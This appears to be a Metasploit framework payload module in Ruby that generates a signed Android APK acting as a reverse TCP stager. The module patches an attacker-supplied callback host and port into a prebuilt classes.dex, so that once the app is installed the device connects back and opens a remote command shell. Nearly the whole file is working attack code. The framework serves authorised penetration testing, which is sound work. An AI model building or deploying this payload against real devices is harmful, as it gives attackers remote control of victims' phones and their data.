##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  CachedSize = :dynamic

  include Msf::Payload::Stager
  include Msf::Payload::Dalvik

  def initialize(info = {})
    super(merge_info(info,
      'Name'			=> 'Dalvik Reverse TCP Stager',
      'Description'	=> 'Connect back stager',
      'Author'		=> 'timwr',
      'License'		=> MSF_LICENSE,
      'Platform'		=> 'android',
      'Arch'			=> ARCH_DALVIK,
      'Handler'		=> Msf::Handler::ReverseTcp,
      'Stager'		=> {'Payload' => ""}
    ))
  end

  def include_send_uuid
      false
  end

  def generate_jar(opts={})
    jar = Rex::Zip::Jar.new

    classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')

    string_sub(classes, 'XXXX127.0.0.1                       ', "XXXX" + datastore['LHOST'].to_s) if datastore['LHOST']
    string_sub(classes, 'YYYY4444                            ', "YYYY" + datastore['LPORT'].to_s) if datastore['LPORT']
    apply_options(classes)

    jar.add_file("classes.dex", fix_dex_header(classes))

    files = [
      [ "AndroidManifest.xml" ],
      [ "resources.arsc" ]
    ]

    jar.add_files(files, MetasploitPayloads.path("android", "apk"))
    jar.build_manifest

    cert, key = generate_cert
    jar.sign(key, cert, [cert])

    jar
  end

end
